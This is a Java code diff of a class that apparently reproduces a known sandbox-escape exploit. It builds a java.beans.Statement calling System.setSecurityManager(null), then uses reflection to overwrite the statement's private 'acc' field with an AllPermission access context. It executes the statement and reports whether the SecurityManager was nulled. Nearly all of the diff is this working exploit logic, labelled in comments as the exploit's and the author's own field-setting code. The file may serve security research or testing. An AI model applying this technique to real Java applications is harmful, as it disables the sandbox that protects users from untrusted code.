@@ -18,6 +18,14 @@ import java.security.ProtectionDomain;
 public class NullSecurityManagerWithAccessControl {
 
 	public static void main(String[] args) throws Throwable {
+		/*Statement s2 = new Statement(Math.class, "abs",
+				new Object[]{new Integer(-8)});
+		System.out.println("Current statement: " + s2.toString());
+		s2.execute();
+		Statement s3 = new Statement(Math.class, "hdslakfdkalsjd",
+				new Object[]{new Integer(-8)});
+		System.out.println("Current statement: " + s3.toString());
+		s3.execute();*/
 		SecurityManager testManager = System.getSecurityManager();
 		if (testManager == null) {
 			Policy.setPolicy(new AccessPermissionPolicy());
@@ -30,7 +38,7 @@ public class NullSecurityManagerWithAccessControl {
 			} catch (AccessControlException e) {
 				System.out.println("Initial policy prevented file read");
 			}
-			Statement s = new Statement(System.class, "setSecurityManager",
+			Statement s = new Statement(Class.forName("java.lang.System"), "setSecurityManager",
 					new Object[1]);
 			Permissions p = new Permissions();
 			p.add(new AllPermission());
@@ -40,18 +48,26 @@ public class NullSecurityManagerWithAccessControl {
 			ProtectionDomain[] pdArray = { pd };
 			AccessControlContext ac = new AccessControlContext(pdArray);
 			//exploits set field
-			SetField(Statement.class, "acc", s, ac);
+			//SetField(Statement.class, "acc", s, ac);
 			//end of exploit's setField
 			//my set field
-			/*Field acc = Statement.class.getDeclaredField("acc");
+			Field acc = Statement.class.getDeclaredField("acc");
 			acc.setAccessible(true);
-			acc.set(s, ac);*/
+			acc.set(s, ac);
 			//end of my set field
 			System.out.println("Current statement: " + s.toString());
 			s.execute();
-			System.out.println("!!!Nulled the SecurityManager!!!");
-			testManager.checkRead("test" + File.separator + "testInput.txt");
-			System.out.println("finished");
+			System.out.println("!!!Attempted to null the SecurityManager!!!");
+			testManager = System.getSecurityManager();
+			if (testManager == null)
+			{
+				System.out.println("!!!Nulled the SecurityManager!!!");
+			}
+			else
+			{
+				System.out.println("!!!Failed to null the SecurityManager!!!");
+			}
+			
 		} else {
 			System.err
 					.println("Error - Security manager was already set before "
